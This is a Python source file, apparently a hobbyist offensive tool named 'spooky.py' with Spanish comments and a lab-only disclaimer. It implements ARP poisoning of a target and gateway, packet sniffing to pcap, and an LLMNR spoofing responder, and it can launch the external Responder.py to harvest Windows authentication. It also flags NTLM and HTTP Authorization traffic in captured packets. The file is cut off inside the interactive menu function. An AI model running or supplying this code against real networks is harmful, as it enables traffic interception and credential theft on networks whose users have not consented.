#!/usr/bin/env python3
# spooky.py
# Herramienta con modo interactivo para MITM + sniffing.
# Uso: sudo python3 spooky.py
# By: Vixy
# ADVERTENCIA: Ejecutar solo en tu laboratorio de VMs con permiso explícito. ;)

import argparse
import threading
import time
import sys
import signal
import subprocess
import shutil
import shlex
from datetime import datetime
from scapy.all import (
    ARP, Ether, srp, send, sniff, wrpcap, conf, get_if_hwaddr,
    IP, UDP, DNS, DNSQR, DNSRR, get_if_addr
)
from pathlib import Path

# ------------------ ASCII ART ------------------
ASCII_ART = r"""
⣽⣻⢷⣿⣻⣽⣟⣷⢿⣻⢾⣯⢿⣽⣳⣟⣷⣻⢷⣻⣞⣯⣟⡷⠏⣩⣤⣶⣿⢿⣟⣯⡿⣞⣯⡷⡯⢋⠀⣽⢿⣽⣳⡿⣞⣿⢷⣻⣯⢿⣽⡾⣿⡽⣾⣻⣽⣻⢾⣻⣾⡽⣯⣟⣷⣻⣽⣻⣾⣽⡄⠻⢾⡽⣷⡌⢷⣻⣽⣟⣯⢿⣞⣯⣟⡾⣷⣿⡄⠻⣵⣻⢮⡷⣏⣷⡻⣞⣷⢻⡽⣽⢞
⣾⣽⣯⣿⢯⣷⢿⣞⣿⣻⣟⣾⣻⣞⣷⣻⢾⣽⢯⣷⡻⢎⣡⣶⣿⣻⢿⣽⣾⣯⢿⡽⣟⣯⢷⡟⠁⠦⡁⢾⣟⡷⣯⡟⣯⣟⣯⣷⣟⡿⣾⣽⣳⡿⣽⡷⣇⢿⣻⢷⣯⢿⣷⣻⣞⣯⣷⢝⢾⣯⢿⣷⣌⠻⣽⣷⡌⢻⣷⣻⢾⣯⣟⡷⣟⣿⣽⡾⡿⠄⠱⣯⢷⣻⡽⡾⣽⣛⡾⣯⡽⣞⣯
⢾⣳⣯⣿⣟⣯⢿⣾⣳⣟⣾⣳⣯⢿⡾⣽⣻⣞⠟⣠⣶⣿⡿⣷⣯⣿⢯⠟⣉⣴⡾⣟⣯⣟⠏⠀⣩⣶⣧⢸⣿⣻⣽⡇⣻⣽⢾⣳⣯⢿⡿⡌⣷⣻⢯⣿⣽⡈⠻⣟⣾⢿⣞⣷⣻⡽⣾⣳⣕⢍⢿⣞⣿⣧⣌⢳⣿⡄⢿⢯⡿⣞⣯⡓⣿⣳⢯⣿⢿⡞⡄⢱⢯⣗⡿⣝⣳⢯⣷⢫⣷⢻⣼
⡿⣽⣞⣿⣾⣻⡿⣾⡽⣾⢷⣯⣟⣯⢿⡳⢋⣴⣾⣟⣯⣷⣿⣿⠽⠋⢡⣾⢿⣽⣻⣽⣻⢎⡴⣾⢿⣽⣿⠘⣷⣯⣷⡇⠼⣟⣯⡿⣞⣿⣽⣷⡘⣯⣿⢾⣽⣇⠡⠙⣯⣿⣻⣞⡷⣟⣷⣻⣽⡷⣅⢝⢾⣽⣻⣦⡙⢿⡌⢻⣽⣻⣽⠃⣿⣽⣻⣾⡏⡹⡴⢀⢻⢮⣟⡽⡽⣞⣳⡟⣞⡿⣼
⣽⣻⣯⣿⡷⣿⣻⢷⣿⣻⣯⢿⣞⣯⢋⣵⣿⣻⣽⣾⠿⢙⣡⢄⡔⣴⣿⣻⢿⣾⣽⣳⣯⢾⣻⣽⡛⢰⣿⡀⣿⣳⣯⡗⢌⣿⣳⣟⣯⣟⣾⢷⣷⠘⡽⣟⣿⣾⡆⠡⠌⢷⡿⣽⣻⢯⣟⡷⣯⣫⣪⡢⡑⢝⢷⣻⢿⣄⠻⡄⢿⣽⣻⠌⣻⣞⣷⢯⣷⠁⡇⡏⡌⣟⡾⣽⣻⣭⢷⣻⡽⣞⢷
⣽⣻⡷⣿⣟⣿⣽⣿⡾⣟⣾⣟⠏⣡⣿⣽⣳⠿⢋⣡⣶⠟⣱⣿⡸⣿⡽⣿⣻⣞⡷⣟⣾⢿⣽⣻⢃⣷⢿⡇⢸⣿⣞⡇⠎⣼⡿⣽⢾⣻⡾⣿⣽⡀⡘⢿⣳⣯⣿⠆⢉⠄⠻⣿⣽⣻⣽⣻⡽⣷⣟⣿⣎⢦⠱⡹⠻⣟⣷⡄⠈⣷⣻⢨⢹⣾⣽⣻⣽⣸⢹⣰⡇⢸⡽⡾⣵⡻⣞⣧⠿⣽⣞
⣽⣻⡽⣿⣯⣿⣟⣾⣟⣿⡳⢡⣾⣿⠟⢋⣥⡾⣿⡽⢣⣾⣿⣿⣿⢆⣤⣛⡳⠿⣟⢯⣿⣟⣿⡇⣼⣯⣿⢿⠘⣷⡯⠿⠨⣔⣿⣿⣯⣿⢿⣾⢷⡇⣷⡈⢟⣾⣻⣿⡄⢊⠤⠙⡾⣯⣷⢿⣽⣷⣻⢾⣽⢷⣷⣎⣦⡈⠛⢿⣆⠘⡵⢂⢺⡇⢺⣿⡽⣿⣼⣿⣼⢸⡽⣽⡳⣟⡽⣞⣻⠷⣞
⣽⣻⡽⣿⣳⣟⣾⣯⢿⠞⣴⡿⢛⣠⣾⣟⣷⣻⡽⣱⣿⣿⣿⢟⣵⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⢦⣶⡶⠶⢶⠂⢲⣬⣭⠁⠤⢸⣯⡷⣯⡿⣞⣿⣦⢸⣿⡌⢷⣿⠯⠛⡀⠊⣁⠈⢛⡙⠻⢷⣯⣟⡿⣾⣻⢾⡽⣯⢷⡈⢢⠙⢷⣄⠉⢆⡷⢸⣿⡽⣯⢿⣽⣾⢈⡷⢯⣽⣫⡽⣏⣷⣻⡽
⣽⣻⡽⣿⣿⣯⣿⣾⢋⠜⣫⣴⣿⣻⡷⣟⣾⡿⢰⡿⠿⠿⠣⡾⠿⢿⣛⣛⡛⣸⣿⣭⣭⣭⡏⣐⣶⣾⢿⠏⣸⠘⣷⣻⡇⠘⡄⣿⣽⢷⣿⣻⢷⣟⠘⣿⣿⣂⢻⣞⣿⣧⡀⠠⠍⡄⠹⣿⣶⣦⣙⠻⣷⣟⣯⣿⡽⣿⣷⡄⢉⠆⡙⢦⠈⣿⢸⣯⡿⣽⣯⣿⢿⠀⣟⣟⣮⢷⣻⢽⡞⣵⣻
⣽⣻⣟⣿⣿⡾⣷⠃⣠⣾⣿⣷⡿⣟⡿⣯⡷⢡⣶⡿⠏⣴⣿⢿⡿⣟⣯⡿⠁⣿⣳⡿⣯⢿⠇⣾⢯⠟⣩⢀⣶⣦⢠⣍⡳⡈⠔⢸⣯⡿⣾⡽⣯⣿⡅⣿⣿⣿⣦⡙⢾⣿⣷⡘⣄⠨⠅⡌⢳⣿⡽⣷⣼⣻⣞⣷⣟⣷⣻⣷⡈⠰⢡⠊⡑⡌⢸⣷⣟⣯⢷⡿⣿⢀⡿⣞⡽⡾⣭⢷⣻⣳⡽
⢾⣽⣯⣿⣿⣽⢃⣾⣿⣟⣷⡿⣿⣟⣿⣻⠃⣾⣟⢃⣼⡿⣽⣯⢿⡿⡝⢠⢀⡿⣷⣟⣿⣻⠀⣟⣡⣾⠏⣼⣿⣿⡄⢟⣿⣧⠘⡀⢿⣽⣳⣿⡽⣷⣇⢻⣿⣿⣿⣶⡈⢳⣟⣧⡸⣷⣌⢐⡂⠙⣿⣽⣾⢯⡿⣾⣽⣞⣯⣿⣳⠈⢆⠱⣂⠄⡈⢾⣟⡾⣿⣽⣿⢨⢷⣏⡿⣽⣹⢯⢷⣛⣾
⣻⢾⡷⣿⣿⣯⣿⣿⡿⣾⢿⣽⣟⡿⣾⡽⢰⣿⢃⡾⣽⣻⣽⡾⣟⡟⢀⠆⢸⡿⣽⡾⣯⢿⠐⣿⣯⣿⢠⣿⣿⣿⣿⡈⢾⣿⣆⠡⠌⢷⣟⣾⡽⣿⢾⠸⣿⣿⣿⣿⣿⣆⠙⣿⣧⠹⣿⣷⣄⠃⠌⠳⣿⣻⣽⣟⣾⣽⣻⣞⡿⣷⡈⠒⣌⠒⡥⢈⢾⣻⡽⣷⣻⢨⢷⢾⣽⣳⢯⣟⣯⣟⢾
⣽⣻⣟⣿⣽⡿⣯⣷⢿⣻⡿⣾⣽⣿⣳⡇⣼⢃⣾⢿⡽⣯⣷⢿⡝⠠⢌⠎⢸⣟⡷⣿⣟⡯⢘⡿⣾⡇⣼⣿⣿⣿⣿⣷⡐⣯⢿⡄⢊⠘⣿⢾⣽⣻⡿⡇⢿⣿⣿⣿⣿⣿⣷⣄⠻⣧⠹⣿⣿⣷⣌⠡⠈⢿⣳⣯⢿⣞⡷⣯⢿⣽⣷⡈⠄⡓⢌⠦⡀⢻⣽⣟⣯⠸⣯⣞⢷⡯⣟⡾⣵⣞⡿
⢾⣽⣞⣿⣟⣿⣽⣯⢿⣻⣽⣟⣯⣷⢿⡇⠇⣼⣯⣟⡿⣽⣯⡟⠠⡘⠆⠎⢸⣿⡽⣟⣾⡇⠐⣿⢿⠁⣿⣿⣿⣿⣿⣿⣷⡩⢿⣧⢀⠊⢽⣯⣟⡷⣿⣳⢸⣿⣿⣿⣿⣿⣿⣿⣷⡌⠧⠙⠿⠿⢿⣓⣤⡀⠙⠯⢿⣻⢿⡽⣟⣾⣽⣧⠀⡈⠒⢢⠱⡀⢻⣾⡗⢸⣳⣞⣯⢿⣹⣽⣳⣻⢾
⣻⢾⣯⣿⣾⣟⡷⣿⣯⢿⣽⢾⣻⣯⡿⡇⢰⣿⣳⢯⣿⣳⣯⠁⠦⡙⢌⠣⢸⣯⣟⣿⣳⠂⡄⣿⣻⢰⣿⣿⣿⣿⣿⣿⣿⣧⡙⣿⡌⣦⠃⢻⣞⣿⡽⣿⡄⣿⣿⣿⣯⣭⣭⣷⢶⠶⠦⠐⠘⠛⠉⠉⠀⠀⣀⠀⠰⢯⣿⣻⣟⣾⡽⣿⣆⠀⠳⠄⠣⠑⡄⢻⡇⢸⢷⢾⣭⣟⣳⢯⣷⢻⣾
⣽⣻⣞⣿⣷⣻⡿⣷⣯⢿⣯⣿⢿⣷⣻⡇⣼⡷⣟⣿⣳⣿⠃⠌⣒⠩⡌⡱⢸⣟⣾⣽⣻⢀⠆⢸⡿⠸⠿⠯⠭⣭⣭⣭⣭⣭⣥⠈⡇⢹⣧⠁⢹⡾⣿⢿⣇⢹⣿⣿⣿⣗⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠘⣿⡆⣷⡌⢿⣳⣿⣳⡿⣯⢿⡄⣿⣿⣦⡈⡐⠀⠃⢼⣯⣟⡾⣭⣟⣯⣞⣿⢺
⢾⣽⢯⣿⡾⣟⣿⣳⣯⡿⣷⣻⣿⢯⣿⢃⣿⣽⢯⡿⣽⡞⢀⠨⠰⡑⢢⡑⠈⣿⢾⣽⣻⠤⢘⠘⣿⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠄⣿⣷⡀⠹⣿⣻⣿⠌⣿⣿⣿⣿⣿⣿⠀⠀⠄⠂⠐⠈⡐⠀⠡⠀⢻⡅⣿⠠⡠⠙⣾⢯⣿⡽⣯⣇⠸⢍⣹⡇⣿⣦⠀⢻⢶⣯⢟⣳⡽⣞⣧⣟⢯
⣻⢾⣯⣿⣟⣿⢷⣯⡷⣿⢯⣷⣿⣻⣽⠰⣿⣞⣿⣻⢿⢁⣾⠀⢣⠱⣁⠚⡄⡿⣟⣾⣽⡂⢸⡇⢃⢸⣧⠘⣿⡆⠀⡀⡀⢀⠀⠄⠰⣄⠸⣿⣿⣄⠹⣿⡽⡇⢻⣿⣿⣿⣿⣿⡀⢈⠀⡇⠠⢁⠠⠈⡐⠠⢸⣸⡇⠰⡡⢃⠈⢿⣳⣿⢯⣿⠆⢿⣿⡇⣷⣻⡇⢈⡿⣞⣯⢿⣽⣻⢾⣭⢿
⢿⣿⡾⣿⣿⣿⣿⣿⢿⣿⡿⣿⣿⣿⡿⢸⣿⣿⣿⣿⡏⣸⣿⠀⠏⠤⢋⢧⡀⢸⣿⢿⣿⡇⢸⣿⠀⠀⣿⣧⢸⣧⠀⠀⡃⢀⠘⠀⠀⣿⣦⠸⣿⣿⣦⠸⣿⣷⠸⣿⣿⣿⣿⣿⣧⠀⠠⣿⠀⠀⠄⢀⡇⠀⣿⣿⠃⣃⢳⠋⠘⡀⠻⣿⡿⣿⣷⢸⣿⢃⣿⣿⡇⢸⡿⣿⡿⡿⣿⣟⡿⣿⢿
⣻⢾⣻⣿⢯⣿⢾⣯⣟⡷⣟⣿⣻⣞⡿⢸⣟⣾⣽⠞⣰⡿⣽⡆⢌⠣⣉⠦⡘⡈⣾⡿⣽⡇⢸⡿⣆⠐⠘⢿⣆⢿⡄⠀⢣⠀⠂⢸⡀⢹⣿⣧⣽⣿⣿⣦⠑⣿⡇⢿⣿⣿⣿⣿⣹⡿⣿⣽⣷⣬⣴⣿⠷⣴⣿⣿⠠⡘⠤⢃⠃⡔⡀⡙⢿⣻⢿⡄⠏⣾⢷⡿⣇⢸⣽⣳⢿⣽⣳⢯⡿⣽⢾
⣻⣟⡷⣿⣿⣻⡿⣾⢯⣿⣻⣟⣿⡽⣟⢸⣯⢷⡏⢰⣿⣻⢯⣇⢈⢒⢡⢒⡡⣁⢱⣿⢷⣯⢸⣿⡽⠀⢃⠈⢿⣎⣿⣴⣿⣧⣶⣿⡇⢾⣿⣿⣿⣿⣿⣿⣷⡘⢧⠘⣿⣿⣿⣿⣷⡿⣄⠈⠛⠻⠟⢋⣰⢟⣽⡇⠰⢡⠃⣸⠰⡘⢠⡇⣌⠻⣯⣷⢸⡿⣯⣿⢧⢸⣳⢯⣟⡾⣽⢯⣟⡷⣻
⣟⣾⣟⣿⣷⢯⣿⣟⡿⣞⣷⣯⣿⡽⣯⢸⣻⣿⢁⣿⣯⣟⣿⣻⡀⠎⢢⠅⣒⢡⠀⣿⣟⣾⡼⣷⣟⠠⣉⢆⠈⢿⣯⡻⣎⠉⠛⠛⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣦⡁⢹⣿⣿⣿⣿⣿⣿⣭⣶⣶⣮⣵⣾⣿⡿⢁⠡⣃⢂⡿⢠⠁⣾⠇⢛⣥⠙⣿⠀⣿⣻⣽⣻⢸⡽⣻⢾⡽⣯⣟⡾⣽⣻
⡿⢾⡽⣿⣾⢿⣻⡾⣟⣿⣽⣾⢯⣟⣿⠰⣿⠇⣼⣟⣾⢿⣳⡿⣧⠘⠤⢩⡐⢊⡔⠈⣿⣞⡿⣷⣻⢀⠲⡈⠖⡀⢻⣿⣯⣥⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢠⢃⡄⣸⡗⢠⢰⡟⠠⢸⢻⡀⠌⠂⢿⡽⣷⣿⢸⡽⢯⡿⣽⣳⢯⣟⡷⣯
⣻⢿⣻⣿⡽⣿⣻⢿⣽⡾⣟⣾⢿⣻⣽⡆⡿⢰⣯⣿⢾⣟⡿⣽⡿⣆⠨⢡⠌⠣⣌⠁⠘⣯⣟⣿⣽⠀⣒⠩⠜⡰⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢆⣊⢀⣿⡇⢀⣾⠃⠰⠈⣿⡇⢈⢧⣸⣟⣷⢿⢨⣟⣯⣟⡷⣯⣟⡾⣽⣳
⣻⣟⡷⣿⣟⣿⣯⡿⣞⣿⢯⣿⣿⣯⢿⡇⠁⣼⣿⣞⣿⣯⣿⢯⣟⣿⡄⠃⡜⢡⠢⡁⢣⡘⡿⣞⣿⠀⠤⠃⠘⣄⠃⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣟⣛⣭⣭⡙⣿⣿⣿⣿⣿⣿⡿⠈⢆⠄⣼⡿⡇⣸⡟⠠⠘⡀⣿⣳⢈⢸⣟⣾⢯⣿⠐⣯⢾⣽⣳⣟⡾⣽⣳⢯
⣳⢿⡽⣿⣟⣯⣿⢿⣽⣾⢿⣳⡿⣯⡿⣿⠀⣿⣿⣞⣿⣳⣿⢯⣟⣾⢿⡄⠘⠤⠓⡄⢹⣷⡘⣽⡿⡇⠈⡇⠘⡄⢣⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⡄⢼⣿⣿⣿⣿⣿⢇⣿⣿⣿⡿⠟⠋⠁⠜⡨⢰⣿⢻⢁⣿⠃⠰⡀⠄⣿⢿⡄⢺⣯⣟⣿⣽⠀⣿⣻⣞⡷⣯⣟⡷⣯⢿
⣽⣻⣿⣷⡿⠿⠺⠿⢯⣿⣻⢿⣽⣿⡽⣿⣞⣿⣳⡟⣋⣍⠻⣯⣟⣾⢯⣿⡄⠡⢋⠔⢸⣷⢷⡈⢿⣧⠘⡰⠀⡅⢣⠡⠘⢤⠈⣉⠙⡛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣶⣭⣭⣯⠭⠵⣚⣛⣭⣶⣾⡇⠈⢠⠙⢀⡟⢆⣿⡿⡏⢀⠳⣀⠀⢻⣯⣷⠩⣷⣻⣾⣽⠀⣷⣻⢾⣽⣳⢯⡿⣽⣻
"""
GREEN = "\033[92m"
RESET = "\033[0m"

# ------------------ Globals ------------------
stopped = False
poison_thread = None
captured_packets = []
lock = threading.Lock()
responder_thread = None
responder_stop = threading.Event()
llmnr_last_reply = {}
llmnr_stats = {"replied": 0, "queries": 0}


def llmnr_handler(pkt):
    # Very small LLMNR responder: reply to A queries with our iface IP
    if DNS in pkt and pkt[DNS].qdcount > 0:
        qname = pkt[DNSQR].qname.decode() if isinstance(pkt[DNSQR].qname, bytes) else pkt[DNSQR].qname
        # Only respond to standard queries
        if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
            iface = opts.get('iface') or conf.iface
            our_ip = get_if_addr(iface) if iface else None
            if not our_ip:
                return
            # record stats
            try:
                llmnr_stats['queries'] = llmnr_stats.get('queries', 0) + 1
            except Exception:
                pass
            # rate-limit replies per name to avoid floods (once per 2s)
            now = time.time()
            last = llmnr_last_reply.get(qname)
            if last and (now - last) < 2.0:
                return
            llmnr_last_reply[qname] = now
            # log the query name and source (metadata-only)
            try:
                if opts.get('log_auth_events'):
                    ts = datetime.now().isoformat()
                    src = pkt[IP].src if IP in pkt else 'unknown'
                    line = f"[{ts}] LLMNR query '{qname}' from {src}"
                    with open(opts.get('auth_logfile','spooky_auth.log'), 'a') as f:
                        f.write(line + "\n")
            except Exception:
                pass
            # craft a simple response
            resp = IP(dst=pkt[IP].src, src=our_ip)/UDP(dport=pkt[UDP].sport, sport=5355)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, type='A', rdata=our_ip))
            send(resp, verbose=0)
            try:
                llmnr_stats['replied'] = llmnr_stats.get('replied', 0) + 1
            except Exception:
                pass


def _llmnr_thread(iface):
    # sniff LLMNR on UDP 5355
    bpf = "udp port 5355"
    try:
        sniff(iface=iface, filter=bpf, prn=llmnr_handler, stop_filter=lambda x: responder_stop.is_set())
    except Exception as e:
        log(f"[!] Error en LLMNR responder: {e}")


def start_llmnr_responder(iface=None):
    global responder_thread, responder_stop
    if not iface:
        iface = opts.get("iface")
    if not iface:
        raise RuntimeError("iface required to start llmnr responder")
    responder_stop.clear()
    responder_thread = threading.Thread(target=_llmnr_thread, args=(iface,), daemon=True)
    responder_thread.start()
    log(f"[*] LLMNR responder iniciado en {iface}")


def stop_llmnr_responder():
    global responder_thread, responder_stop
    responder_stop.set()
    if responder_thread is not None:
        responder_thread.join(timeout=2)
    responder_thread = None
    log("[*] LLMNR responder detenido")


def run_responder_external():
    # Try to locate Responder.py in common locations or current dir
    candidate = shutil.which("Responder.py") or shutil.which("responder.py")
    if not candidate:
        # check local repo
        local = Path("Responder.py")
        if local.exists():
            candidate = str(local)
    if not candidate:
        raise RuntimeError("Responder.py no encontrado en PATH ni en el directorio actual")
    # spawn it with supervised logs
    log(f"[*] Lanzando Responder externo: {candidate}")
    # ensure logs dir
    logs_dir = Path("logs")
    try:
        logs_dir.mkdir(exist_ok=True)
    except Exception:
        pass
    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_file = logs_dir / f"responder_{ts}.log"
    try:
        fh = open(str(log_file), "ab")
    except Exception:
        fh = subprocess.DEVNULL
    proc = subprocess.Popen(["python3", candidate, "-I", opts.get("iface") or conf.iface], stdout=fh, stderr=fh)
    opts["_responder_proc"] = proc

    # Supervisor thread: restarts process up to limit if enabled
    def supervisor():
        stop_ev = opts.get("_responder_supervisor_stop")
        restarts = 0
        limit = opts.get("responder_restart_limit", 3)
        last_proc = proc
        while not (stop_ev and stop_ev.is_set()):
            current = opts.get("_responder_proc")
            if current and current.poll() is None:
                time.sleep(1)
                continue
            # process exited or not set
            if current:
                rc = current.poll()
                log(f"[!] Responder exited with code {rc}")
            if not opts.get("responder_supervise", True):
                break
            if restarts >= limit:
                log(f"[!] Responder restart limit reached ({limit}). Not restarting.")
                break
            restarts += 1
            log(f"[*] Reiniciando Responder (intento {restarts}/{limit})...")
            try:
                # reopen log file to append
                fh2 = open(str(log_file), "ab")
                newp = subprocess.Popen(["python3", candidate, "-I", opts.get("iface") or conf.iface], stdout=fh2, stderr=fh2)
                opts["_responder_proc"] = newp
            except Exception as e:
                log(f"[!] Error reiniciando Responder: {e}")
                break
            time.sleep(1)
        log("[*] Responder supervisor terminado")

    if opts.get("responder_supervise", True):
        stop_ev = threading.Event()
        opts["_responder_supervisor_stop"] = stop_ev
        th = threading.Thread(target=supervisor, daemon=True)
        opts["_responder_supervisor_thread"] = th
        th.start()
    return proc

# Runtime options (defaults)
opts = {
    "iface": None,
    "target": None,
    "gateway": None,
    "pcap": "spooky_capture.pcap",
    "timeout": 60,
    "interval": 2.0,
    "only_sniff": False,
    "promisc": False,
    "use_tcpdump": False,
    "bpf_filter": "",   # BPF expression (tcpdump/Scapy)
    "enable_logging": True,
    # Auth-event logging: metadata-only (no secrets)
    "log_auth_events": False,
    "auth_logfile": "spooky_auth.log",
    "logfile": "spooky.log",
    # pcap rotation
    "max_pcap_size_mb": 0,  # 0 = disabled
    "max_pcap_files": 5,
    # responder supervision defaults
    "responder_supervise": True,
    "responder_restart_limit": 3,
    # consent gating
    "require_consent_file": None,
}

# Resolved MACs
target_mac = None
gateway_mac = None

# ------------------ Utils ------------------
def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    if opts["enable_logging"]:
        try:
            with open(opts["logfile"], "a") as f:
                f.write(line + "\n")
        except Exception:
            pass

def get_mac(ip, iface, timeout=2, retry=2):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, _ = srp(pkt, iface=iface, timeout=timeout, retry=retry, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def ensure_pcap_parent(pcap_path):
    p = Path(pcap_path)
    if not p.parent.exists():
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass

def rotate_pcap_if_needed(pcap_path):
    """Rotate pcap files when size exceeds configured max (simple numeric rotation).
    """
    try:
        max_mb = int(opts.get("max_pcap_size_mb", 0) or 0)
        if max_mb <= 0:
            return
        p = Path(pcap_path)
        if not p.exists():
            return
        size_mb = p.stat().st_size / (1024.0*1024.0)
        if size_mb < max_mb:
            return
        max_files = int(opts.get("max_pcap_files", 5) or 5)
        # rotate: pcap -> pcap.1, pcap.1 -> pcap.2, keep up to max_files
        for i in range(max_files-1, 0, -1):
            src = p.with_suffix(p.suffix + f".{i}")
            dst = p.with_suffix(p.suffix + f".{i+1}")
            if src.exists():
                try:
                    src.rename(dst)
                except Exception:
                    pass
        # move current to .1
        try:
            p.rename(p.with_suffix(p.suffix + ".1"))
        except Exception:
            pass
        log(f"[*] Rotated pcap {pcap_path} (size {size_mb:.1f}MB)")
    except Exception:
        pass

def show_auth_log(tail=50):
    path = opts.get('auth_logfile','spooky_auth.log')
    p = Path(path)
    if not p.exists():
        print(f"No existe archivo de auth-log: {path}")
        return
    try:
        with open(path, 'r') as f:
            lines = f.readlines()
        if tail and tail > 0:
            for l in lines[-tail:]:
                print(l.rstrip())
        else:
            for l in lines:
                print(l.rstrip())
    except Exception as e:
        print(f"Error leyendo auth-log: {e}")

def check_consent_or_raise():
    """If require_consent_file is configured, ensure it exists and contains token 'CONSENT'"""
    path = opts.get('require_consent_file')
    if not path:
        return True
    p = Path(path)
    if not p.exists():
        raise RuntimeError(f"Consent file required but not found: {path}")
    try:
        content = p.read_text()
        if 'CONSENT' in content:
            log(f"[*] Consentimiento verificado en {path}")
            return True
    except Exception:
        pass
    raise RuntimeError(f"Consent file {path} invalid or missing token")

def cleanup_responder_supervisor():
    try:
        stop_ev = opts.get('_responder_supervisor_stop')
        if stop_ev:
            stop_ev.set()
        th = opts.get('_responder_supervisor_thread')
        if th and th.is_alive():
            th.join(timeout=2)
        # terminate process if running
        proc = opts.get('_responder_proc')
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except Exception:
                proc.kill()
    except Exception:
        pass

def restore_arp(target_ip, target_mac_local, gateway_ip, gateway_mac_local, iface, count=5):
    log("[*] Restaurando ARP (envío paquetes correctos)...")
    pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst=target_mac_local, psrc=gateway_ip, hwsrc=gateway_mac_local)
    pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_local, psrc=target_ip, hwsrc=target_mac_local)
    for _ in range(count):
        send(pkt1, iface=iface, verbose=0)
        send(pkt2, iface=iface, verbose=0)
        time.sleep(0.3)
    log("[*] ARP restaurado.")

def poison_loop(t_ip, t_mac, g_ip, g_mac, iface, interval=2.0):
    global stopped
    fake_to_target = ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=g_ip)
    fake_to_gateway = ARP(op=2, pdst=g_ip, hwdst=g_mac, psrc=t_ip)
    sent = 0
    log("[*] Poison loop activo.")
    while not stopped:
        send(fake_to_target, iface=iface, verbose=0)
        send(fake_to_gateway, iface=iface, verbose=0)
        sent += 2
        time.sleep(max(0.1, interval))
    log(f"[*] Poison loop detenido. {sent} paquetes enviados (estimado).")
    return sent

def packet_handler(pkt):
    with lock:
        captured_packets.append(pkt)
    # print brief summary
    try:
        print(pkt.summary())
    except Exception:
        pass
    # detect auth-like indicators (metadata-only)
    try:
        detected = check_packet_for_auth(pkt)
        if detected:
            print(GREEN + f"[!] Indicador de autenticación detectado: {detected}" + RESET)
    except Exception:
        pass


def check_packet_for_auth(pkt):
    """Detect simple auth indicators without extracting secrets.
    Returns a short description string when found, else None.
    """
    raw = None
    try:
        # scapy stores raw payload often in .load
        if hasattr(pkt, 'load'):
            raw = bytes(pkt.load)
        else:
            # try common transports
            if pkt.haslayer('TCP') and pkt['TCP'].payload:
                raw = bytes(pkt['TCP'].payload)
            elif pkt.haslayer('UDP') and pkt['UDP'].payload:
                raw = bytes(pkt['UDP'].payload)
    except Exception:
        raw = None
    if not raw:
        return None
    lower = raw.lower()
    if b'ntlmssp' in lower:
        _log_auth_event('NTLMSSP indicator', pkt)
        return 'NTLMSSP'
    if b'authorization:' in lower:
        _log_auth_event('HTTP Authorization header', pkt)
        return 'HTTP Authorization header'
    if b'www-authenticate' in lower:
        _log_auth_event('WWW-Authenticate header', pkt)
        return 'WWW-Authenticate'
    return None


def _log_auth_event(kind, pkt):
    """Log auth-indicator metadata only. No credentials stored."""
    if not opts.get('log_auth_events'):
        return
    try:
        ts = datetime.now().isoformat()
        src = pkt[IP].src if IP in pkt else 'unknown'
        dst = pkt[IP].dst if IP in pkt else 'unknown'
        summary = pkt.summary() if hasattr(pkt, 'summary') else str(pkt)
        line = f"[{ts}] {kind} from {src} -> {dst} | {summary}"
        with open(opts.get('auth_logfile', 'spooky_auth.log'), 'a') as f:
            f.write(line + "\n")
        log(f"[!] {kind} detectado desde {src} (registrado en {opts.get('auth_logfile')})")
    except Exception:
        pass

# ------------------ Signal handling ------------------
def graceful_exit(signum, frame):
    global stopped, poison_thread, target_mac, gateway_mac
    # show menu (ASCII art printed in print_menu())
    # restore ARP if we have data
    try:
        if target_mac and gateway_mac and opts["iface"] and opts["target"] and opts["gateway"]:
            restore_arp(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"])
    except Exception as e:
        log(f"[!] Error restaurando ARP: {e}")
    # if using tcpdump, terminate process
    try:
        if opts.get("_tcpdump_proc"):
            proc = opts["_tcpdump_proc"]
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=3)
                log("[*] tcpdump detenido.")
    except Exception:
        pass
    # stop responder thread if running
    try:
        if responder_thread is not None and responder_thread.is_alive():
            responder_stop.set()
            responder_thread.join(timeout=2)
            log("[*] Responder detenido.")
    except Exception:
        pass
    # cleanup supervised external responder if any
    try:
        cleanup_responder_supervisor()
    except Exception:
        pass
    # save pcap if captured by scapy
    if captured_packets:
        try:
            wrpcap(opts["pcap"], captured_packets)
            log(f"[*] Guardado {len(captured_packets)} paquetes (scapy) en {opts['pcap']}")
        except Exception as e:
            log(f"[!] Error guardando pcap (scapy): {e}")
    log("[*] Salida limpia. Happy hacking!")
    sys.exit(0)

signal.signal(signal.SIGINT, graceful_exit)
signal.signal(signal.SIGTERM, graceful_exit)

# ------------------ Interactive menu ------------------
def print_menu():
    print(GREEN + ASCII_ART + RESET)
    print("Modo interactivo — configura opciones. Escribe el número o comando y presiona Enter.")
    print("Opciones actuales:")
